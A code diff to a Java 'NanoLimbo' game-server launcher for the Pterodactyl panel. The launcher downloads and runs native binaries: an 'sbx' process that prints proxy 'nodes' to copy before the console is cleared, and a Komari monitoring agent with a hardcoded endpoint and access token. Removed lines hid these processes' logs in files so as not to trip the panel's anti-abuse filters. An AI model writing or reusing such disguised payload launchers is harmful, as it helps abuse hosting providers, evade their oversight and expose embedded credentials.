@@ -4,7 +4,7 @@
  * Java 8 compatible build for Pterodactyl Java game panel.
  * Komari logic:
  *   1) Download and start Komari native agent first.
- *   2) Print native agent logs to file so failures don't trigger panel anti-abuse filters.
+ *   2) Print native agent logs to panel so failures are visible.
  *   3) If native agent exits quickly, automatically fallback to pure Java HTTP reporter.
  *   4) No local listening port is used by Komari.
  */
@@ -35,6 +35,7 @@ public final class NanoLimbo {
     private static Thread komariReporterThread;
 
     // 默认值保留。也可以在翼龙变量中使用 KOMARI_SERVER / KOMARI_TOKEN / ACCESS_TOKEN 覆盖。
+    // 注意：endpoint 末尾不能带空格。
     private static final String DEFAULT_KOMARI_ENDPOINT = "https://k.wgb.ccwu.cc";
     private static final String DEFAULT_KOMARI_TOKEN = "oS2BX5b3hHWBmAfG6KwsL1";
 
@@ -67,8 +68,8 @@ public final class NanoLimbo {
 
             Thread.sleep(15000L);
             System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Node details saved to file ./world/sub.txt" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
             Thread.sleep(15000L);
             clearConsole();
         } catch (Exception e) {
@@ -78,10 +79,6 @@ public final class NanoLimbo {
 
         try {
             new LimboServer().start();
-            // 常驻挂起主线程，防止 Limbo 服务启动完后进程直接退出
-            while (running.get()) {
-                Thread.sleep(10000L);
-            }
         } catch (Exception e) {
             Log.error("Cannot start server: ", e);
         }
@@ -110,9 +107,7 @@ public final class NanoLimbo {
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
-        // 修改：输出写入文件 sbx.log，不在面板控制台上打日志
-        File sbxLog = new File("sbx.log");
-        pb.redirectOutput(ProcessBuilder.Redirect.to(sbxLog));
+        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
         sbxProcess = pb.start();
     }
 
@@ -141,7 +136,7 @@ public final class NanoLimbo {
             return;
         }
 
-        System.out.println(ANSI_GREEN + "[Komari] native agent preparing, endpoint=" + endpoint + ANSI_RESET);
+        System.out.println(ANSI_GREEN + "[Komari] native agent preparing, endpoint=" + endpoint + ", token_length=" + token.length() + ANSI_RESET);
 
         try {
             Path agentPath = getKomariNativeAgentPath();
@@ -158,9 +153,8 @@ public final class NanoLimbo {
 
             cleanKomariEnv(pb.environment());
             pb.redirectErrorStream(true);
-            // 修改：输出写入文件 komari.log，不在控制台暴露
-            File komariLog = new File("komari.log");
-            pb.redirectOutput(ProcessBuilder.Redirect.to(komariLog));
+            // 关键：不再 DISCARD。直接继承输出，方便看真实错误。
+            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
 
             komariProcess = pb.start();
             Thread.sleep(6000L);
@@ -171,7 +165,7 @@ public final class NanoLimbo {
             }
 
             int exitCode = komariProcess.exitValue();
-            System.err.println(ANSI_YELLOW + "[Komari] native agent exited, code=" + exitCode + ", switching to Java HTTP reporter" + ANSI_RESET);
+            System.err.println(ANSI_YELLOW + "[Komari] native agent exited quickly, code=" + exitCode + ", switching to Java HTTP reporter" + ANSI_RESET);
             startKomariHttpReporter(endpoint, token, interval, "native_agent_exited_" + exitCode);
         } catch (Exception e) {
             System.err.println(ANSI_YELLOW + "[Komari] native agent startup failed: " + e.getMessage() + ", switching to Java HTTP reporter" + ANSI_RESET);
@@ -211,7 +205,7 @@ public final class NanoLimbo {
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), fileName);
 
         if (!Files.exists(path) || Files.size(path) == 0L) {
-            System.out.println(ANSI_GREEN + "[Komari] downloading native agent..." + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "[Komari] downloading native agent: " + url + ANSI_RESET);
             InputStream in = new URL(url).openStream();
             try { Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING); }
             finally { in.close(); }
@@ -221,6 +215,7 @@ public final class NanoLimbo {
         return path;
     }
 
+    /** Java HTTP reporter fallback. No external komari-agent binary, no local port. */
     private static void startKomariHttpReporter(final String endpoint, final String token, final int interval, final String reason) {
         final String server = endpoint.endsWith("/") ? endpoint.substring(0, endpoint.length() - 1) : endpoint;
         komariReporterThread = new Thread(new Runnable() {
@@ -229,7 +224,7 @@ public final class NanoLimbo {
         }, "komari-http-reporter");
         komariReporterThread.setDaemon(true);
         komariReporterThread.start();
-        System.out.println(ANSI_GREEN + "[Komari] Java HTTP reporter started, reason=" + reason + ANSI_RESET);
+        System.out.println(ANSI_GREEN + "[Komari] Java HTTP reporter started, reason=" + reason + ", endpoint=" + server + ", token_length=" + token.length() + ANSI_RESET);
     }
 
     private static void runKomariReporterLoop(String server, String token, int interval) {
@@ -288,7 +283,7 @@ public final class NanoLimbo {
                     + "\"connections\":{\"tcp\":0,\"udp\":0},"
                     + "\"uptime\":" + uptime + ","
                     + "\"process\":" + processCount + ","
-                    + "\"message\":\"online via java8 http reporter\""
+                    + "\"message\":\"online via java8 http reporter; no local port used\""
                     + "}";
                 postJson(server, "/api/clients/report", token, reportJson);
             } catch (Exception e) {
@@ -315,8 +310,14 @@ public final class NanoLimbo {
             try { os.write(json.getBytes("UTF-8")); }
             finally { os.close(); }
             int code = conn.getResponseCode();
-            return (code >= 200 && code < 300);
+            if (code >= 200 && code < 300) {
+                System.out.println(ANSI_GREEN + "[Komari] POST " + path + " -> " + code + ANSI_RESET);
+                return true;
+            }
+            System.err.println(ANSI_YELLOW + "[Komari] POST " + path + " -> " + code + ANSI_RESET);
+            return false;
         } catch (Exception e) {
+            System.err.println(ANSI_RED + "[Komari] POST " + path + " failed: " + e.getMessage() + ANSI_RESET);
             return false;
         } finally {
             if (conn != null) conn.disconnect();
